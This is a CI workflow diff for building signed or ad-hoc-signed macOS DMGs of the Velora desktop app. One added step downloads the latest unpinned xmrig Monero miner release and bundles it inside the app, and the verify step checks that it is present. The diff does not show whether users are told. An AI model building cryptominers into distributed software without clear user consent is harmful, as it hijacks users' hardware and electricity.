@@ -4,13 +4,27 @@ on:
   workflow_dispatch:
 
 permissions:
-  contents: write
+  contents: read
 
 jobs:
   build:
-    name: macOS unsigned beta
-    runs-on: macos-latest
+    name: macOS ${{ matrix.label }} beta
+    runs-on: macos-15
+    strategy:
+      max-parallel: 1
+      fail-fast: false
+      matrix:
+        include:
+          - target: aarch64-apple-darwin
+            miner_asset: mac-arm64
+            artifact_arch: aarch64
+            label: Apple Silicon
+          - target: x86_64-apple-darwin
+            miner_asset: mac-intel
+            artifact_arch: x86_64
+            label: Intel
     env:
+      MACOS_OFFICIAL_SIGNING_ENABLED: ${{ vars.MACOS_OFFICIAL_SIGNING_ENABLED || 'false' }}
       APPLE_CERTIFICATE_P12_BASE64: ${{ secrets.APPLE_CERTIFICATE_P12_BASE64 }}
       APPLE_CERTIFICATE_PASSWORD: ${{ secrets.APPLE_CERTIFICATE_PASSWORD }}
       APPLE_SIGNING_IDENTITY: ${{ secrets.APPLE_SIGNING_IDENTITY }}
@@ -33,12 +47,12 @@ jobs:
 
       - uses: dtolnay/rust-toolchain@stable
         with:
-          targets: aarch64-apple-darwin,x86_64-apple-darwin
+          targets: ${{ matrix.target }}
 
       - uses: Swatinem/rust-cache@v2
         with:
           workspaces: apps/desktop/src-tauri -> target
-          key: macos-latest
+          key: macos-${{ matrix.target }}
 
       - name: Install dependencies
         run: pnpm install --frozen-lockfile
@@ -47,26 +61,53 @@ jobs:
         working-directory: apps/desktop
         run: pnpm exec tauri icon src-tauri/icons/icon.png
 
-      - name: Build shared packages
-        run: pnpm --filter @velora/shared build
+      - name: Prepare integrated miner
+        shell: bash
+        env:
+          MINER_ASSET: ${{ matrix.miner_asset }}
+        run: |
+          set -euo pipefail
+          release_json="$(curl --fail --silent --show-error --location -H 'Accept: application/vnd.github+json' https://api.github.com/repos/MoneroOcean/xmrig/releases/latest)"
+          download_url="$(printf '%s' "$release_json" | jq -r --arg asset "$MINER_ASSET" '.assets[] | select(.name | contains($asset)) | .browser_download_url' | head -1)"
+          test -n "$download_url"
+          work_dir="$(mktemp -d)"
+          curl --fail --show-error --location "$download_url" -o "$work_dir/xmrig.tar.gz"
+          tar -xzf "$work_dir/xmrig.tar.gz" -C "$work_dir"
+          miner="$(find "$work_dir" -type f -name xmrig | head -1)"
+          test -n "$miner"
+          mkdir -p apps/desktop/src-tauri/resources/miner
+          install -m 755 "$miner" apps/desktop/src-tauri/resources/miner/xmrig
+          shasum -a 256 apps/desktop/src-tauri/resources/miner/xmrig | awk '{print $1}' > apps/desktop/src-tauri/resources/miner/xmrig.sha256
+          file apps/desktop/src-tauri/resources/miner/xmrig
+          lipo -info apps/desktop/src-tauri/resources/miner/xmrig
 
-      - name: Typecheck desktop
-        run: pnpm --filter @velora/desktop typecheck
+      - name: Validate source
+        run: |
+          pnpm --filter @velora/shared build
+          pnpm --filter @velora/desktop typecheck
+          pnpm --filter @velora/sdk test
+          pnpm --filter @velora/desktop build
+          cargo check --manifest-path apps/desktop/src-tauri/Cargo.toml --target "${{ matrix.target }}"
+          cargo test --manifest-path apps/desktop/src-tauri/Cargo.toml --target "${{ matrix.target }}"
 
-      - name: Test SDK
-        run: pnpm --filter @velora/sdk test
-
-      - name: Build desktop frontend
-        run: pnpm --filter @velora/desktop build
-
-      - name: Cargo check
-        working-directory: apps/desktop/src-tauri
-        run: cargo check
+      - name: Validate official signing configuration
+        if: ${{ env.MACOS_OFFICIAL_SIGNING_ENABLED == 'true' }}
+        shell: bash
+        run: |
+          set -euo pipefail
+          test -n "$APPLE_CERTIFICATE_P12_BASE64"
+          test -n "$APPLE_CERTIFICATE_PASSWORD"
+          test -n "$APPLE_SIGNING_IDENTITY"
+          test -n "$APPLE_ID"
+          test -n "$APPLE_APP_SPECIFIC_PASSWORD"
+          test -n "$APPLE_TEAM_ID"
 
       - name: Import Apple Developer ID certificate
-        if: ${{ env.APPLE_CERTIFICATE_P12_BASE64 != '' && env.APPLE_CERTIFICATE_PASSWORD != '' && env.APPLE_TEAM_ID != '' }}
+        if: ${{ env.MACOS_OFFICIAL_SIGNING_ENABLED == 'true' }}
+        shell: bash
         run: |
-          echo "$APPLE_CERTIFICATE_P12_BASE64" | base64 --decode > certificate.p12
+          set -euo pipefail
+          printf '%s' "$APPLE_CERTIFICATE_P12_BASE64" | base64 --decode > certificate.p12
           KEYCHAIN_PASS="${KEYCHAIN_PASSWORD:-velora-ci-keychain}"
           security create-keychain -p "$KEYCHAIN_PASS" build.keychain
           security default-keychain -s build.keychain
@@ -74,52 +115,125 @@ jobs:
           security import certificate.p12 -k build.keychain -P "$APPLE_CERTIFICATE_PASSWORD" -T /usr/bin/codesign
           security set-key-partition-list -S apple-tool:,apple:,codesign: -s -k "$KEYCHAIN_PASS" build.keychain
 
-      - name: Build macOS beta
+      - name: Build macOS application
         working-directory: apps/desktop
         shell: bash
         run: |
-          if [ -n "${APPLE_SIGNING_IDENTITY:-}" ]; then
-            pnpm exec tauri build --config src-tauri/tauri.macos.conf.json
-          else
+          set -euo pipefail
+          if [ "$MACOS_OFFICIAL_SIGNING_ENABLED" != "true" ]; then
             unset APPLE_SIGNING_IDENTITY
-            pnpm exec tauri build --config src-tauri/tauri.macos.conf.json
           fi
+          pnpm exec tauri build --target "${{ matrix.target }}" --config src-tauri/tauri.macos.conf.json
 
-      - name: Ad-hoc sign unsigned macOS app and rebuild DMG
-        if: ${{ env.APPLE_SIGNING_IDENTITY == '' }}
+      - name: Sign nested components and rebuild DMG
+        if: ${{ env.MACOS_OFFICIAL_SIGNING_ENABLED != 'true' }}
         shell: bash
+        env:
+          TARGET: ${{ matrix.target }}
+          ARTIFACT_ARCH: ${{ matrix.artifact_arch }}
         run: |
-          app="apps/desktop/src-tauri/target/release/bundle/macos/Velora.app"
-          dmg="apps/desktop/src-tauri/target/release/bundle/dmg/Velora_0.1.0_aarch64.dmg"
+          set -euo pipefail
+          bundle_root="apps/desktop/src-tauri/target/$TARGET/release/bundle"
+          app="$bundle_root/macos/Velora.app"
+          main_executable="$(/usr/libexec/PlistBuddy -c 'Print :CFBundleExecutable' "$app/Contents/Info.plist")"
+          main_path="$app/Contents/MacOS/$main_executable"
+
+          while IFS= read -r nested; do
+            [ "$nested" = "$main_path" ] && continue
+            if file "$nested" | grep -q 'Mach-O'; then
+              chmod 755 "$nested"
+              codesign --force --sign - "$nested"
+            fi
+          done < <(find "$app/Contents" -type f -perm -111 | sort)
+
+          find "$app/Contents/Frameworks" -depth -type d -name '*.framework' 2>/dev/null | while IFS= read -r framework; do
+            codesign --force --sign - "$framework"
+          done
+          codesign --force --sign - "$main_path"
+          codesign --force --sign - "$app"
+          codesign --verify --strict --verbose=4 "$app"
+
+          old_dmg="$(find "$bundle_root/dmg" -maxdepth 1 -type f -name '*.dmg' | head -1)"
+          final_dmg="$bundle_root/dmg/Velora_0.1.0_${ARTIFACT_ARCH}.dmg"
           staging="$(mktemp -d)"
-          codesign --force --deep --options runtime --sign - "$app"
-          codesign --verify --deep --strict --verbose=2 "$app"
-          rm -f "$dmg"
-          mkdir -p "$staging"
+          rm -f "$old_dmg" "$final_dmg"
           cp -R "$app" "$staging/Velora.app"
           ln -s /Applications "$staging/Applications"
-          hdiutil create -volname "Velora" -srcfolder "$staging" -ov -format UDZO "$dmg"
+          hdiutil create -volname Velora -srcfolder "$staging" -ov -format UDZO "$final_dmg"
 
       - name: Notarize and staple DMG
-        if: ${{ env.APPLE_ID != '' && env.APPLE_APP_SPECIFIC_PASSWORD != '' && env.APPLE_TEAM_ID != '' }}
-        run: |
-          find apps/desktop/src-tauri/target/release/bundle -type f -name "*.dmg" -print0 | while IFS= read -r -d '' dmg; do
-            xcrun notarytool submit "$dmg" --apple-id "$APPLE_ID" --password "$APPLE_APP_SPECIFIC_PASSWORD" --team-id "$APPLE_TEAM_ID" --wait
-            xcrun stapler staple "$dmg"
-          done
-
-      - name: Compute SHA-256
+        if: ${{ env.MACOS_OFFICIAL_SIGNING_ENABLED == 'true' }}
         shell: bash
+        env:
+          TARGET: ${{ matrix.target }}
         run: |
-          mkdir -p releases/beta/macos/latest
-          find apps/desktop/src-tauri/target/release/bundle -type f \( -name "*.dmg" -o -name "*.app.tar.gz" \) -print0 | while IFS= read -r -d '' file; do
-            cp "$file" "releases/beta/macos/latest/$(basename "$file")"
-            shasum -a 256 "$file" > "releases/beta/macos/latest/$(basename "$file").sha256.txt"
-          done
+          set -euo pipefail
+          dmg="$(find "apps/desktop/src-tauri/target/$TARGET/release/bundle/dmg" -maxdepth 1 -type f -name '*.dmg' | head -1)"
+          xcrun notarytool submit "$dmg" --apple-id "$APPLE_ID" --password "$APPLE_APP_SPECIFIC_PASSWORD" --team-id "$APPLE_TEAM_ID" --wait
+          xcrun stapler staple "$dmg"
 
-      - name: Upload macOS artifacts
+      - name: Verify packaged DMG
+        shell: bash
+        env:
+          TARGET: ${{ matrix.target }}
+          ARTIFACT_ARCH: ${{ matrix.artifact_arch }}
+        run: |
+          set -euo pipefail
+          bundle_root="apps/desktop/src-tauri/target/$TARGET/release/bundle"
+          dmg="$(find "$bundle_root/dmg" -maxdepth 1 -type f -name '*.dmg' | head -1)"
+          mount_dir="$(mktemp -d)"
+          report="releases/beta/macos/Velora_0.1.0_${ARTIFACT_ARCH}.diagnostics.txt"
+          mkdir -p releases/beta/macos
+          hdiutil attach "$dmg" -nobrowse -mountpoint "$mount_dir"
+          trap 'hdiutil detach "$mount_dir" -force >/dev/null 2>&1 || true' EXIT
+          app="$mount_dir/Velora.app"
+          plist="$app/Contents/Info.plist"
+          main_executable="$(/usr/libexec/PlistBuddy -c 'Print :CFBundleExecutable' "$plist")"
+          main_path="$app/Contents/MacOS/$main_executable"
+          miner_path="$app/Contents/Resources/miner/xmrig"
+          plutil -lint "$plist"
+          test "$(/usr/libexec/PlistBuddy -c 'Print :CFBundleIdentifier' "$plist")" = 'com.velora.desktop'
+          test "$(/usr/libexec/PlistBuddy -c 'Print :LSMinimumSystemVersion' "$plist")" = '12.0'
+          test -x "$main_path"
+          test -x "$miner_path"
+          expected_miner_hash="$(cat "$app/Contents/Resources/miner/xmrig.sha256")"
+          test "$(shasum -a 256 "$miner_path" | awk '{print $1}')" = "$expected_miner_hash"
+          file "$main_path" | grep -q "$ARTIFACT_ARCH\|arm64\|x86_64"
+          file "$miner_path" | grep -q "$ARTIFACT_ARCH\|arm64\|x86_64"
+          codesign --verify --strict --verbose=4 "$app"
+          {
+            echo "Bundle: $app"
+            plutil -p "$plist"
+            file "$main_path"
+            lipo -info "$main_path"
+            file "$miner_path"
+            lipo -info "$miner_path"
+            otool -L "$main_path"
+            codesign --display --verbose=4 "$app" 2>&1
+            codesign --verify --strict --verbose=4 "$app" 2>&1
+            spctl --assess --type execute --verbose=4 "$app" 2>&1 || true
+            xattr -l "$app" 2>&1 || true
+          } > "$report"
+          hdiutil detach "$mount_dir"
+          trap - EXIT
+
+      - name: Publish build artifact
+        shell: bash
+        env:
+          TARGET: ${{ matrix.target }}
+          ARTIFACT_ARCH: ${{ matrix.artifact_arch }}
+        run: |
+          set -euo pipefail
+          mkdir -p releases/beta/macos/latest
+          source_dmg="$(find "apps/desktop/src-tauri/target/$TARGET/release/bundle/dmg" -maxdepth 1 -type f -name '*.dmg' | head -1)"
+          output_dmg="releases/beta/macos/latest/Velora_0.1.0_${ARTIFACT_ARCH}.dmg"
+          cp "$source_dmg" "$output_dmg"
+          shasum -a 256 "$output_dmg" > "$output_dmg.sha256.txt"
+          cp "releases/beta/macos/Velora_0.1.0_${ARTIFACT_ARCH}.diagnostics.txt" releases/beta/macos/latest/
+
+      - name: Upload macOS artifact
         uses: actions/upload-artifact@v4
         with:
-          name: velora-macos-unsigned-beta
+          name: velora-macos-${{ matrix.artifact_arch }}-beta
           path: releases/beta/macos/latest
           if-no-files-found: error
